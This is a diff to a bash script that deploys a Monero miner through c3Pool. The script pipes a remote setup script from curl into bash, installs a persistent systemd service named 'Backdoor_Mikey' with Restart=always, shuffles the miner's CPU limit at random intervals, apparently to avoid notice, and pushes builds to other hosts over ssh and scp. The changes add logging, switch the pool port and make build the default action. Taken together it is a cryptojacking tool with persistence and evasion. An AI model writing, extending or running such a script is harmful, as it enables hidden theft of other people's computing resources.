@@ -20,7 +20,7 @@ echo '
 #     33333: 15000 diff (SSL)
 #     43333: 2G diff (ETH port)
 #     53333: 2G diff (ETH port/SSL/TLS)
-poolPort=17777
+poolPort=19999
 # your wallet public address
 wallet=YOUR_WALLET_ADDRESS
 # installation directory (DONT change)
@@ -40,12 +40,19 @@ detatched=true
 
 
 # ======== c3Pool setup script for Monero Miner ======== 
+function log () {
+    echo "[DirtyMike]: $1"
+}
+function center () {
+    COLUMNS=$(tput cols)
+    printf "%*s\n" $(((${#1}+$COLUMNS)/2)) "$1"
+}
 function killAll () {
     killall -9 cpulimit
     sed -i '/c3pool/d' $HOME/.profile;
     killall -9 xmrig;
     sudo systemctl stop Backdoor_Mikey.service  
-    killall -9 bash
+    log 'killed all services.'
 }
 function stopService () {
     systemctl stop c3pool_miner.service
@@ -65,15 +72,19 @@ function CPU_threads () {
     # echo $(cpuThreads)
     grep -c ^processor /proc/cpuinfo
 }
+function miner_instance_running () {
+    # returns boolean if miner is running
+    echo ''
+}
 function shuffle () {
     sleep 1;
     while true;
     do echo "shuffle CPU limit ...";
     lim=`echo $(shuf -i$CPU_min_lim-$CPU_max_lim -n1)`;
     threads=`echo $(grep -c ^processor /proc/cpuinfo)`;
-    echo "[CPU threads]:" $threads
-    echo "[CPU limit shuffle]: limiting CPU usage to $lim% ...";
-    echo upper limit $(($threads*$lim));
+    log "[CPU threads]:" $threads
+    log "[CPU limit shuffle]: limiting CPU usage to $lim% ...";
+    log "upper limit $(($threads*$lim))";
     cpulimit -e xmrig -l $(($threads*$lim)) & # 2 t/c
     sleep $(shuf -i15-45 -n1);
     pkill cpulimit; 
@@ -99,7 +110,7 @@ function setPort () {
 }
 function install () {
     if [ ! -d "$DIR" ]; then
-        echo installing XMR mining setup ... [FFA]
+        log 'installing XMR mining setup ... [FFA]'
         sudo apt update &&
         sudo apt install -y curl && sudo apt install -y cpulimit
         curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s $wallet
@@ -115,7 +126,15 @@ function uninstall () {
         echo "Hostname: ";read IP;echo "Login: ";read USER
         ssh $USER@$IP "rm -r $DIR"
     else
-        rm -r $DIR
+        if [ ! -d "$DIR" ]; then
+            echo '[DirtyMike]: no miner installation found on this host.';
+        else
+            rm -r $DIR
+            sleep 1; clear;
+            center 'Thanks for the F-shack! DirtyMike and the Boyz 😙'
+            sleep 5; clear
+        fi
+    fi
 }
 function refresh () {
     sudo systemctl daemon-reload
@@ -128,7 +147,6 @@ function daemon () {
   [Unit]
 Description=Dirty Mike
 [Service]
-ExecStartPre=shuffle
 ExecStart=$HOME/c3pool/xmrig --config=$HOME/c3pool/config.json
 Restart=always
 Nice=8
@@ -142,9 +160,9 @@ EOL
     sudo systemctl enable Backdoor_Mikey.service
     sudo systemctl start Backdoor_Mikey.service  
 }
-function daemon2 () {
+# function daemon2 () {
 
-}
+# }
 function build () {
     killAll       
     wait
@@ -162,7 +180,7 @@ function build () {
 # interpret
 mode=$1;
 if [[ "$mode" == "-r" ]]; then # draw host credentials
-    echo $USER deploying build remotely at $IP ...
+    log "$USER deploying build remotely at $IP ..."
     echo "Hostname: ";read IP;echo "Login: ";read USER
     scp -r ./* $USER@$IP:/home && \
     if [[ $detatched == true ]]; then
@@ -174,4 +192,6 @@ elif [[ "$mode" == "-k" ]]; then
     killAll
 elif [[ "$mode" == "-u" ]]; then
     uninstall
+else
+    build
 fi
